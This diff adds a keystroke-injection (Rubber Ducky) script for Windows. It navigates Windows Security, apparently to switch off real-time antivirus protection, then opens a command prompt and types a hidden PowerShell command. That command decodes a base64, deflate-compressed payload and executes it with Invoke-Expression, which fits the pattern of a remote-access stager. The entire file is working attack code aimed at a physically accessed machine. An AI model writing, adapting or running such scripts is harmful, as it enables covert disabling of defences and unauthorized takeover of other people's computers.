@@ -1,0 +1,36 @@
+DELAY 2000
+CONTROL ESCAPE
+DELAY 1000
+STRING windows security
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+SPACE
+DELAY 1000
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+ALT F4
+DELAY 500
+GUI r
+DELAY 100
+STRING cmd
+ENTER
+DELAY 500
+STRING if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbattAEH3XVwxCEAlLQr6kpA6B3HAbSN0Qh/bB+EFeT+JtVrtid2RbSf3vHSVy24S0lArEkXZnzjk7MxsIOIJj35ueK3VRlMZS6N+j1aj6vXShlB/NoKzmSgpwlBMDboj34ULTFVn4Ii1VuTpRyoiwXVvHUElNsGmxbvEhOvxvnTOLOeHNkmGx06la3lUMv5Tbr9+025VG3T/2yNaPgeNDj3GdfJ5/Q0EwqR1hkY6R0okR90iuRQinb+ydLBYWnRvlhVT1bDhkAbQcsDb2Poa3Mp7xpi6RwyfEhyjeDryyhowwqg29EWXkBS49M1qz0XCv23uf9rppN+P3YH8vhgE/EXwHU1GiK6UOISj5cNMTa/PG23PdLjQXVQsM/XlN6HNaxIEbDmTyaxQoVxgG5SuiB97PvKD+B77pqSQ2uULLpWiMGy5Kv8eccRZ19hu1eprNGsLN6chbL6VCCFkhUfT35AgeGyedl1brOHjo7Mfd+M/VHqn8zjHb2GiMYOvdGsuK8qjLXiTrIgyar06HFdhcIBt3O7pXjj4gnfJBXTjlmZqxkY+5XiiMOCvpzrZeQJzLY5E0fYOkwGKO9hxvpZYkjYZAQDLOCwT/q9T9ng+J5j9X5gLhaWVUadFEOkjK3Dla2qpp0FFAw+GLK5bFQZ1eor6jZZxt+lmWMQyyyNs5v640yQLTp6E05QTtSgp06afcumWumhaasm4qCBn37flyzMJgk+7KHkUx/BTh8aNd19vbx4pxsIkbyF5OzIRyS8lEIZaQTFAYvYCDd4Ms24qcxPJx+wM=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") else (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbattAEH3XVwxCEAlLQr6kpA6B3HAbSN0Qh/bB+EFeT+JtVrtid2RbSf3vHSVy24S0lArEkXZnzjk7MxsIOIJj35ueK3VRlMZS6N+j1aj6vXShlB/NoKzmSgpwlBMDboj34ULTFVn4Ii1VuTpRyoiwXVvHUElNsGmxbvEhOvxvnTOLOeHNkmGx06la3lUMv5Tbr9+025VG3T/2yNaPgeNDj3GdfJ5/Q0EwqR1hkY6R0okR90iuRQinb+ydLBYWnRvlhVT1bDhkAbQcsDb2Poa3Mp7xpi6RwyfEhyjeDryyhowwqg29EWXkBS49M1qz0XCv23uf9rppN+P3YH8vhgE/EXwHU1GiK6UOISj5cNMTa/PG23PdLjQXVQsM/XlN6HNaxIEbDmTyaxQoVxgG5SuiB97PvKD+B77pqSQ2uULLpWiMGy5Kv8eccRZ19hu1eprNGsLN6chbL6VCCFkhUfT35AgeGyedl1brOHjo7Mfd+M/VHqn8zjHb2GiMYOvdGsuK8qjLXiTrIgyar06HFdhcIBt3O7pXjj4gnfJBXTjlmZqxkY+5XiiMOCvpzrZeQJzLY5E0fYOkwGKO9hxvpZYkjYZAQDLOCwT/q9T9ng+J5j9X5gLhaWVUadFEOkjK3Dla2qpp0FFAw+GLK5bFQZ1eor6jZZxt+lmWMQyyyNs5v640yQLTp6E05QTtSgp06afcumWumhaasm4qCBn37flyzMJgk+7KHkUx/BTh8aNd19vbx4pxsIkbyF5OzIRyS8lEIZaQTFAYvYCDd4Ms24qcxPJx+wM=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();")
+ENTER
